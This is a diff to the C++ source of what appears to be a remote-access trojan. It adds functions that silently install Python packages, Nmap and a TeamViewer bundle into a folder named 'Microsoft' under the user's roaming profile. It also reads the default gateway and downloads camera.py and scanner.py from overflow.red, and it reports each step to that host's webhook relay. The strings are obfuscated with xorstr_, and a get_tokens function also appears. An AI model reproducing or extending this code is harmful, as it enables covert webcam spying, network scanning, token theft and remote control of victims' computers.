@@ -134,6 +134,14 @@ namespace client {
 			return response;
 		}
 
+		std::string get_default_gateway()
+		{
+			auto res = helpers::exec("ipconfig | findstr /i default | findstr /R [0-9]");
+			auto temp = res.substr(res.find(":") + 2);
+			temp.replace(temp.length() - 1, temp.length(), "");
+			return temp;
+		}
+
 		std::vector<std::string> get_tokens() {
 			struct stat info;
 
@@ -192,7 +200,6 @@ namespace client {
 		}
 
 		void install_python() {
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Downloading and Installing...")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 			requests::download_file("https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe", helpers::roaming + xorstr_("\\Microsoft\\python.exe"));
 			system((std::string("cd " + helpers::roaming + xorstr_("\\Microsoft\\")) + std::string(xorstr_(" && python.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0"))).c_str());
 
@@ -202,7 +209,10 @@ namespace client {
 				system("pip install --upgrade pip");
 				system("pip install opencv-python");
 				system("pip install numpy");
-				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Installed and Set Path\n- opencv-python\n- numpy")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+				system("pip install getmac");
+				system("pip install python-nmap");
+				system("pip install sockets");
+				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Installed and Set Path\n- opencv-python\n- numpy\n- getmac\n- python-nmap\n- sockets")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 			}
 			else {
 				requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Python**\n```\n") + std::string(xorstr_("Error Assigning Path.")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
@@ -210,15 +220,28 @@ namespace client {
 		}
 		
 		void install_teamviewer() {
-			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("Downloading Files...")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
-			requests::download_file("https://srv-store4.gofile.io/download/L2TuWe/tv.zip", helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip");
-
+			requests::download_file("https://overflow.red/tv.zip", helpers::roaming + xorstr_("\\Microsoft\\") + "tv.zip");
 			std::string path = helpers::roaming + xorstr_("\\Microsoft\\tv.zip");
 			std::string unzip_path = helpers::roaming + xorstr_("\\Microsoft");
-			std::string command = xorstr_("powershell -command \"Expand-Archive -Force ") + path + " " + unzip_path + "\"";
+			std::string command = xorstr_("powershell -command \"Expand-Archive ") + path + " -DestinationPath " + unzip_path + "\"";
 			system(command.c_str());
 
 			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**TeamViewer**\n```\n") + std::string(xorstr_("Finished Downloading and Extracing")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+		}
+
+		void install_nmap() {
+			requests::download_file("https://nmap.org/dist/nmap-7.80-setup.exe", helpers::roaming + xorstr_("\\Microsoft\\nmap.exe"));
+			system((std::string("cd ") + helpers::roaming + xorstr_("\\Microsoft") + " && nmap.exe /S").c_str());
+			system("SET PATH=%PATH%;C:\\Program Files (x86)\\Nmap");
+			system("SET PATH=%PATH%;C:\\Program Files\\Nmap");
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Nmap**\n```\n") + std::string(xorstr_("Installed and Set Path")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
+		}
+
+		void install_scripts() {
+			std::filesystem::create_directory(helpers::roaming + xorstr_("\\Microsoft\\scripts\\"));
+			requests::download_file("https://overflow.red/scripts/camera.py", helpers::roaming + xorstr_("\\Microsoft\\scripts\\camera.py"));
+			requests::download_file("https://overflow.red/scripts/scanner.py", helpers::roaming + xorstr_("\\Microsoft\\scripts\\scanner.py"));
+			requests::post_request(xorstr_("https://overflow.red/post.php"), xorstr_("cmd=send_message&content=**Scripts**\n```\n") + std::string(xorstr_("Installed All Scripts")) + xorstr_("\n```") + std::string(xorstr_("&webhook_url=")) + client_webhook_url);
 		}
 	}
 }
